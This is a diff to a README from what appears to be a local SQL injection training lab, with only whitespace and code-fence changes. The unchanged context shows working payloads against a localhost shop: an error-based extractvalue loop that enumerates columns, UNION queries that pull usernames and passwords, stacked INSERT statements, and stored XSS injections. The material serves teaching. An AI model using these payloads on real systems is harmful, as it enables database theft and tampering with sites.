@@ -66,10 +66,13 @@ for i in {0..20}; do
   wget -q -O - "http://localhost/product/1\" AND extractvalue(rand(),concat(0x3a,(SELECT COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME=\"products\" AND table_schema=\"sqlitraining\" LIMIT ${i},1)))-- //" | grep mysqli_sql_exception | cut -d" " -f9
 done
 ```
+
 it shouldn't take much imagination to figure out how you could automate stealing all rows
 
 # union leak
+
 we don't know how many columns were in the original query so we have to brute force queries to satisfy the original query
+
 ```
 http://localhost/product/-1" UNION SELECT username FROM users where id=1 -- //
 http://localhost/product/-1" UNION SELECT username, password FROM users where id=1 -- //
@@ -77,14 +80,17 @@ http://localhost/product/-1" UNION SELECT username, password, username FROM user
 
 http://localhost/product/-1" UNION SELECT username,username,password,password,username FROM users where id=1 -- //
 ```
+
 ###
 
-
 ## inserting
+
 ```
 http://localhost/product/1"; INSERT INTO products(product_name, product_type, description, price) VALUES("hack", "hack", "hack", 1); -- //
 ```
+
 ## inserting with xss
+
 ```
 http://localhost/product/1"; INSERT INTO products(product_name, product_type, description, price) VALUES("<script>alert('hi')</script>", "hack", "hack", 1); -- //
 http://localhost/product/1"; INSERT INTO products(description, product_name, product_type, price) VALUES("<iframe width=560 height=315 src='https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ'></iframe>", "never gonna", "give you up", 1); -- //
@@ -105,4 +111,7 @@ helm install main nginx-stable/nginx-ingress \
  --set controller.image.pullPolicy=Never \
  --set controller.service.type=NodePort \
  --set controller.service.httpPort.nodePort=30000
+
+```
+
 ```
